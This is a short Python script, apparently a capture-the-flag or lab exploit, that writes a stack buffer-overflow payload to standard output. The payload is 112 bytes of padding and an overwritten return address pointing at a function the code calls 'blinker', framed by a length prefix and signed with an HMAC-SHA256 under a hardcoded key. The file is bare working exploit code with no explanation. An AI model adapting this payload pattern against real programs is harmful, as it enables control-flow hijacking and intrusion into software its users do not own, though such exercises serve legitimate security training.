import sys
import hashlib
import hmac


"""
4e1435fd
ab0792f3
7aae8208
bb09d1d
8d77684f
99695b71
49d153bb
d4880319
"""
addyofblinker = 0x080496d7
padding = b'A' * 112

data = padding + bytes.fromhex("080496d7")

sys.stdout.buffer.write(len(padding + (0x080496d7).to_bytes(4,'little')).to_bytes(4, 'little') 
                        + padding + (0x080496d7).to_bytes(4,'little') + 
                        hmac.new(bytes.fromhex("fd35144ef39207ab0882ae7a1d9db00b4f68778d715b6999bb53d149190388d4"), padding + (0x080496d7).to_bytes(4,'little'), hashlib.sha256).digest())



